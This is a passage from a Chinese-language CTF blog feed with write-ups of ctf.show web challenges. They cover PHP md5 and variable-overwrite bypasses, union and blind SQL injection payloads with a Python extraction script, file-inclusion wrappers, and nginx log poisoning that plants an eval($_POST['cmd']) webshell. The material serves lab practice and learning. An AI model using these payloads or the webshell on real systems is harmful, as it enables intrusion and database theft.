class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Wrong.&#x27;</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>这一关使用MD5碰撞<br>而且使post方式所以要在hackbar里的post data里输入<br>我们这里使用数组的方式绕过，payload：a[]&#x3D;1 &amp; b[]&#x3D;2<br>可以看到页面上出现了warning，但也显示了flag，这是因为PHP对无法md5加密的东西不加密，结果为NULL，虽然会报错，但是null&#x3D;null，逻辑关系为True。所以可以输出flag。</p><h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-variable">$_GET</span>?<span class="hljs-variable">$_GET</span>=&amp;<span class="hljs-variable">$_POST</span>:<span class="hljs-string">&#x27;flag&#x27;</span>;<br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]==<span class="hljs-string">&#x27;flag&#x27;</span>?<span class="hljs-variable">$_GET</span>=&amp;<span class="hljs-variable">$_COOKIE</span>:<span class="hljs-string">&#x27;flag&#x27;</span>;<br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]==<span class="hljs-string">&#x27;flag&#x27;</span>?<span class="hljs-variable">$_GET</span>=&amp;<span class="hljs-variable">$_SERVER</span>:<span class="hljs-string">&#x27;flag&#x27;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="hljs-string">&#x27;flag&#x27;</span>?<span class="hljs-variable">$flag</span>:<span class="hljs-keyword">__FILE__</span>); <br></code></pre></td></tr></table></figure><p>考点：变量覆盖、三元运算符、&amp;在php中的应用作用<br>第一句的意思是如果存在GET请求则引用POST请求的内容<br>所以我们url栏中随便填一填<br>然后再在hackbar上的post data输入关键句HTTP_FLAG&#x3D;flag<br>这样就成功回显了flag<br>所以第一句存在变量覆盖的效果，所以GET请求不管给什么东西都会被post请求覆盖掉</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ctf_web</title>
    <link href="/2023/04/25/ctfweb/"/>
    <url>/2023/04/25/ctfweb/</url>
    
    <content type="html"><![CDATA[<h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>ctrl+u查看源代码即可找到base64编码形式的flag</p><h2 id="web2：sql注入"><a href="#web2：sql注入" class="headerlink" title="web2：sql注入"></a>web2：sql注入</h2><p>输入万能钥匙<br><img src="/images/fuck.png"><br>使用burp suite抓包<br>在burp suite里右键选择send to repeater<br>使用联合查询来查询回显位置</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure><p><img src="/images/1.png"><br>接着就是爆库</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure><p>爆表</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database()#<br></code></pre></td></tr></table></figure><p>爆字段</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> fron information_schema.columns where table_name=&#x27;flag&#x27;#<br></code></pre></td></tr></table></figure><p>爆值</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,flag,<span class="hljs-number">3</span> from flag#<br></code></pre></td></tr></table></figure><p><img src="/images/2.png"><br>获得flag</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>页面中显示了部分源码，明显是引导我们利用文件包含漏洞进行操作，源码中的include()函数通过GET请求接受一个url参数，那接下来我们就给它传递一个url参数</p><p>这里我们使用burp suite抓包，利用php:&#x2F;&#x2F;input伪协议执行PHP代码，代码的内容为执行系统命令，查看当前目录下所有文件。</p><p><img src="/images/3.png"></p><p>很明显这个ctf_go_go_go文件就是存放flag的文件<br><img src="/images/4.png"><br>我们直接在url地址中拼接url参数，访问ctf_go_go文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">url</span>=ctf_go_go_go<br></code></pre></td></tr></table></figure><p>成功获取flag!</p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>进入题目，看到只有一句文件包含的提示。<br>这题使用input协议data协议都不可行，应该是被禁用了，所以从数据包入手<br><img src="/images/5.png"></p><p>我们发现该道题使用的是nginx服务器，那我们想到可不可以通过日志文件进行写码得到flag呢，所以我们访问日志看看</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?url=<span class="hljs-regexp">/var/</span>lg<span class="hljs-regexp">/nginx/</span>access.log<br></code></pre></td></tr></table></figure><p><img src="/images/6.png"></p><blockquote><p>查看日志发现，每访问一次数据包中的User-Agent头会被写进日志中，那就尝试在UA头中写码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/images/7.png"></p><blockquote><p>在UA头后插入一句话木马后日志文件里并未显示说明木马已经被解析了，然后使用蚁剑连接。</p></blockquote><p><img src="/images/8.png"><br>连接后，flag就在网页根目录中<br><img src="/images/9.png"><br>获得flag！</p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>首先打开页面是一个页面源码，我们先来进行代码审计，看看有没有可以利用的地方</p><p>重点审计这段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable">$v1</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>        <span class="hljs-variable">$v2</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$v1</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$v2</span>))&#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">ctype_alpha</span>(<span class="hljs-variable">$v1</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;v1 error&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;v2 error&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$v1</span>)==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$v2</span>))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>        <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;where is flag?&quot;</span>;<br>        &#125;<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>有四个if语句，构造的v1和v2满足这三个条件即可得到flag<br>第一个if语句要求v1和v2不能为空<br>这里有两个php检测函数</p><blockquote><ul><li>ctype_alpha ——做纯字符检测</li><li>ctype_alpha(string $text): bool</li></ul></blockquote><p>查看提供的string，text里面的所有字符是否只包含字符。 在标准的 C 语言环境下，字母仅仅是指 [A-Za-z] ， ctype_alpha() 等同于 (ctype_upper($text) || ctype_lower($text)) 如果 text 是简单的单个字符串还好，但是在其他语言中有些字母被认为既不是大写也不是小写。</p><p>所以，我们构造的v1必须是只有字母，才能绕过第二个if语句的过滤</p><blockquote><ul><li>is_numeric()函数用于检测变量是否为数字或数字字符串。<br>如果指定的变量是数字和数字字符串则返回TRUE，否则返回FALSE，注意浮点型返回空值，即返回FALSE。</li></ul></blockquote><p>也就是说，v2必须是只有数字，才能绕过第三个if语句的过滤</p><p>然后再看最后一条if语句，要求v1和v2的值经过MD5加密后还必须相等，if(md5($v1)&#x3D;&#x3D;md5($v2)),接下来我们开始想方法构造v1和v2的值</p><p>md5漏洞介绍：<br>PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0<br>所以只要v1与v2的md5值以0E开头即可。这样最后php解析到的v1和v2的md5值就都是0了<br>构造v1&#x3D;QNKCDZO&amp;v2&#x3D;240610708</p><p>0e开头的md5和原值：<br>QNKCDZO<br>0e830400451993494058024219903391<br>240610708<br>0e462097431906509019562988736854</p><p>输入到url中，成功获取flag</p><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>username尝试输入万能密码1’ or 1&#x3D;1#<br>密码随意<br>显示sql inject error，发现有字符被过滤。<br>逐个字符输入后发现过滤了空格，一般空格被过滤有如下替换方法</p><blockquote><p>&#x2F;**&#x2F;<br>()<br>回车(url编码中的%0a)<br>&#96;(tap键上面的按钮)<br>tap<br>两个空格</p></blockquote><p>这里选择&#x2F;**&#x2F;</p><p>接下来就到了广为人知的爆库，爆表，爆字段，爆字段值环节</p><p>爆库</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27;<span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">union</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-built_in">database</span>(),<span class="hljs-number">3</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>爆表</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(table_name)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.tables<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema=database()),<span class="hljs-number">3</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>爆字段</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(column_name)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.columns<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_name=<span class="hljs-string">&#x27;flag&#x27;</span>),<span class="hljs-number">3</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>爆字段值</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>flag<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>flag),<span class="hljs-number">3</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>得到flag</p><h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>又又又是sql注入漏洞题<br>一共有三个文章，通过点击切换不同的文章可以看出url地址的差别，页面同过文章的id值来查询文章内容，我们可以考虑sql注入漏洞<br><img src="/images/10.png"><br>首先判断注入点，输入以下payload，使sql恒成立</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?id=<span class="hljs-number">1</span><span class="hljs-regexp">/**/</span>and<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>页面正常显示</p><p>再输入以下payload，使sql恒不成立</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?id=<span class="hljs-number">1</span><span class="hljs-regexp">/**/</span>and<span class="hljs-regexp">/**/</span><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>页面空显示</p><p>由此可以判断页面存在sql注入，注入点为<strong>数值型注入</strong>，页面中有显示位，可以尝试<strong>联合注入</strong>进行脱库<br>先来判断显示位，此处id传一个-1，由于id通常不为负数，后端根据id查询不到内容，就只能展示联合查询的结果，从而帮助我们判断字段显示的位置</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">-<span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/**/</span>select<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p><img src="/images/11.png"><br>下面就是广为人知的爆*环节了<br>爆库</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">-<span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/**/</span>select<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>爆表</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-built_in">table_name</span>)<span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.<span class="hljs-keyword">tables</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema=<span class="hljs-keyword">database</span>()),<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>爆字段</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-built_in">column_name</span>)<span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.<span class="hljs-keyword">columns</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">table_name</span>=&quot;flag&quot;),<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>爆字段值</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">-<span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/**/</span>select<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span>,(select<span class="hljs-regexp">/**/</span>flag<span class="hljs-regexp">/**/</span>from<span class="hljs-regexp">/**/</span>flag),<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>成功获取flag值</p><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>本题过滤了空格，逗号，and，union等关键字<br>空格依旧是用&#x2F;**&#x2F;替代<br>and可使用or 替代</p><p>首先狠狠的注入，输入以下payload使sql恒成立</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?id=-<span class="hljs-number">1</span><span class="hljs-regexp">/**/</span>or<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>由于sql恒成立，数据库将查询出表中的所有内容，并返回到前端展示<br><img src="/images/555.png"></p><p>在输入以下payload使sql恒不成立</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?id=-<span class="hljs-number">1</span><span class="hljs-regexp">/**/</span>or<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span>=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>由于sql恒不成立，数据库查询不到任何数据，从而导致页面空显示</p><p>由以上结果可知，该页面存在sql注入，注入点为数值型注入</p><p>接下来进行脱库，由于盲注脱库比较复杂，此处我们拿抄来的python脚本😊进行自动化脱库，注意payload中的字符串不换行，否则可能会出问题</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">import requests<br> <br>url = &#x27;http://9d1bf0f8-9f4f-4cd2-bd17-a1024a0d065c.challenge.ctf.show/index.php?id=-1<span class="hljs-comment">/**/</span>or<span class="hljs-comment">/**/</span>&#x27;<br>name = &#x27;&#x27;<br> <br># 循环45次( 循环次数按照返回的字符串长度自定义)<br>for i in range(1, 45):<br>    # 获取当前使用的数据库<br>    # payload = &#x27;ascii(substr(database()from<span class="hljs-comment">/**/</span>%d<span class="hljs-comment">/**/</span>for<span class="hljs-comment">/**/</span>1))=%d&#x27;<br>    # 获取当前数据库的所有表<br>    # payload = &#x27;ascii(substr((<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(table_name)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.tables<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema=<span class="hljs-keyword">database</span>())<span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>%d<span class="hljs-comment">/**/</span><span class="hljs-keyword">for</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>))=%d<span class="hljs-string">&#x27;</span><br><span class="hljs-string">    # 获取flag表的字段</span><br><span class="hljs-string">    # payload = &#x27;</span>ascii(<span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(column_name)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.columns<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_name=<span class="hljs-number">0x666C6167</span>)<span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>%d<span class="hljs-comment">/**/</span><span class="hljs-keyword">for</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>))=%d<span class="hljs-string">&#x27;</span><br><span class="hljs-string">    # 获取flag表的数据</span><br><span class="hljs-string">    payload = &#x27;</span>ascii(<span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>flag<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>flag)<span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>%d<span class="hljs-comment">/**/</span><span class="hljs-keyword">for</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>))=%d<span class="hljs-string">&#x27;</span><br><span class="hljs-string">    count = 0</span><br><span class="hljs-string">    print(&#x27;</span>正在获取第 %d 个字符<span class="hljs-string">&#x27; % i)</span><br><span class="hljs-string">    # 截取SQL查询结果的每个字符, 并判断字符内容</span><br><span class="hljs-string">    for j in range(31, 128):</span><br><span class="hljs-string">        result = requests.get(url + payload % (i, j))</span><br><span class="hljs-string"> </span><br><span class="hljs-string">        if &#x27;</span><span class="hljs-keyword">If</span><span class="hljs-string">&#x27; in result.text:</span><br><span class="hljs-string">            name += chr(j)</span><br><span class="hljs-string">            print(&#x27;</span>数据库名/表名/字段名/数据: %s<span class="hljs-string">&#x27; % name)</span><br><span class="hljs-string">            break</span><br><span class="hljs-string"> </span><br><span class="hljs-string">        # 如果某个字符不存在,则停止程序</span><br><span class="hljs-string">        count += 1</span><br><span class="hljs-string">        if count &gt;= (128 - 31):</span><br><span class="hljs-string">            exit()</span><br></code></pre></td></tr></table></figure><p>获取数据库<br><img src="/images/23.png"></p><p>获取表<br><img src="/images/233.png"></p><p>获取字段<br><img src="/images/2333.png"></p><p>获取flag<br><img src="/images/23333.png"></p><h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>这题不能用常规方法做<br>在url中输入index.phps，可以发现下载了一个文件，打开。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$password</span>)&gt;<span class="hljs-number">10</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;password error&quot;</span>);<br>&#125;<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>,<span class="hljs-literal">true</span>).<span class="hljs-string">&quot;&#x27;&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_num_rows</span>(<span class="hljs-variable">$result</span>)&gt;<span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>(<span class="hljs-variable">$result</span>))&#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;登陆成功&lt;br&gt;&quot;</span>;<br> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br> &#125;<br>&#125;<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>发现是使用MD5加密，利用MD5的漏洞在密码中输入ffidyop，登录成功，得到flag</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>web入门：文件包含🥰</title>
    <link href="/2023/04/20/wenjianbaohan/"/>
    <url>/2023/04/20/wenjianbaohan/</url>
    
    <content type="html"><![CDATA[<h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>include包含，尝试使用伪协议</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p>使用base64解码获得flag</p><h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = <span class="hljs-symbol">$</span>_GET[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = str_replace(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>    include(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>str_replace()函数把php替换成了???<br>使用data协议：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=data:<span 